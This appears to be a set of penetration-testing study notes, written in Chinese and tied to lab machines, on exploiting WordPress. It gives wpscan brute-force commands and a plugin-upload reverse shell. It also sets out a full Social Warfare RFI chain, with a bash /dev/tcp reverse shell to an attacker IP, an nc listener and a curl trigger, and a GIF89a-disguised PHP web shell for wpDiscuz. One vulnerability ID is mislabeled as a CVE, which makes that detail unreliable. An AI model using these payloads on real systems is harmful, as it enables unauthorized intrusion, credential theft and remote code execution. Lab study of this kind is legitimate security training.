# WordPress 漏洞利用與安全測試 (wordpress)
本文件整理針對 WordPress CMS 的偵察、漏洞利用與 Web Shell 寫入的手法。

## 🔍 Wpscan 漏洞與使用者列舉
使用 wpscan 對 WordPress 進行安全性掃描、使用者列舉以及密碼爆破。

> [!tip] **強制掃描參數**
> 若目標 WordPress 架設在非標準子目錄下，或因偵測限制導致 wpscan 預設拒絕掃描時，需加上 `--force` 參數以強制執行掃描。

```bash
# 1. 進行外掛與漏洞掃描 (忽略 SSL，若被阻擋可加 --force)
wpscan --url https://<target-ip>/blog/ -e ap --plugins-detection aggressive --force --disable-tls-checks

# 2. 進行使用者列舉 (User Enumeration，若被阻擋可加 --force)
wpscan --url https://<target-ip>/blog/ -e u --force --disable-tls-checks

# 3. 針對列舉出的使用者進行密碼暴力破解
wpscan --url https://<target-ip>/blog/ --usernames john,peter --passwords /usr/share/wordlists/rockyou.txt

# 4. 利用 XML-RPC 對特定使用者進行密碼暴力破解 (效率較高)
wpscan --url https://<target-ip>/blog/ --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt
```

## 💥 Advanced Video 1.0 本地檔案包含 (CVE-2016-39646)
若所使用的外掛存在本地檔案包含漏洞（例如 Advanced Video 1.0 外掛的 CVE-2016-39646），可讀取關鍵設定檔（如 `wp-config.php`）獲取資料庫 root 密碼。

## 💥 後台 ZIP 外掛上傳提權
登入管理後台後，若擁有外掛安裝權限，可將 PHP Reverse Shell 檔案打包為 `.zip`，於 `Plugins > Add New > Upload Plugin` 功能中上傳。隨後存取其上傳路徑即可獲得反彈 Shell。

## 💥 Social Warfare 遠端代碼執行 (CVE-2019-9978)
當 WordPress 啟用舊版 `Social Warfare` 外掛（< 3.5.3）時，可利用其 `swp_url` 參數載入攻擊者託管的惡意 PHP 程式碼，實現遠端任意代碼執行 (RCE)。

### 🛠️ 利用方法
1.  **在攻擊機上準備 payload 檔案**（例如 `shell.txt`）：
    ```php
    <pre>system('bash -c "bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1"')</pre>
    ```
2.  **開啟簡易 HTTP 服務** 供目標主機讀取：
    ```bash
    python3 -m http.server 8000
    ```
3.  **攻擊機端開啟監聽**：
    ```bash
    nc -lvnp <PORT>
    ```
4.  **觸發 RCE 漏洞**（向 `admin-post.php` 接口傳入惡意 payload 連結）：
    ```bash
    curl "http://<target-ip>/wp-admin/admin-post.php?swp_url=http://<KALI_IP>:8000/shell.txt"
    ```

## 💥 wpDiscuz 7.0.4 未授權任意檔案上傳 (CVE-2020-24186)
在 WordPress 啟用舊版 `wpDiscuz` 留言板外掛（7.0.4）時，其圖片上傳功能存在未授權任意檔案上傳漏洞。攻擊者不需登入即可上傳惡意 PHP Web Shell 取得遠端程式碼執行 (RCE) 權限。

### 🛠️ 利用方法與 Magic Number 繞過
1. **準備包含 Magic Number 的惡意 PHP Shell**：
   因為該外掛後端會透過讀取檔案頭部特徵來驗證檔案是否為合法圖片，我們可以在 `.php` 檔案最前端手動加入 GIF 的 Magic Number / File Signature `GIF89a;` 來進行繞過：
   ```php
   GIF89a;
   <?php system($_GET['cmd']); ?>
   ```
2. **上傳並攔截修改封包**：
   在留言評論區上傳此偽裝檔案。如果遇到前端副檔名限制，可透過 Burp Suite 攔截上傳請求，並確保將 `Content-Type` 欄位修改為 `image/gif`，同時將上傳的檔案名稱保持為 `.php` 副檔名（例如 `shell.php`）。
3. **獲取與存取 Web Shell**：
   上傳成功後，外掛會在回傳包或頁面留言處暴露該圖片連結。該惡意 PHP 檔案將被儲存在伺服器目錄中（通常位於 `/wp-content/uploads/wpdiscuz/` 底下）。直接存取該連結即可執行任意系統指令：
   ```bash
   curl "http://<target-ip>/wp-content/uploads/wpdiscuz/cache/themes/assets/gcs/.../shell.php?cmd=whoami"
   ```

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Stapler]] (利用 Advanced Video 1.0 本地檔案包含與外掛上傳)
    *   [[SoSimple]] (利用 Social Warfare 遠端代碼執行)
    *   [[Blogger]] (利用 wpDiscuz 漏洞與 GIF89a Magic Number 繞過實現未授權 RCE，並以 wpscan 進行 XML-RPC 爆破嘗試)
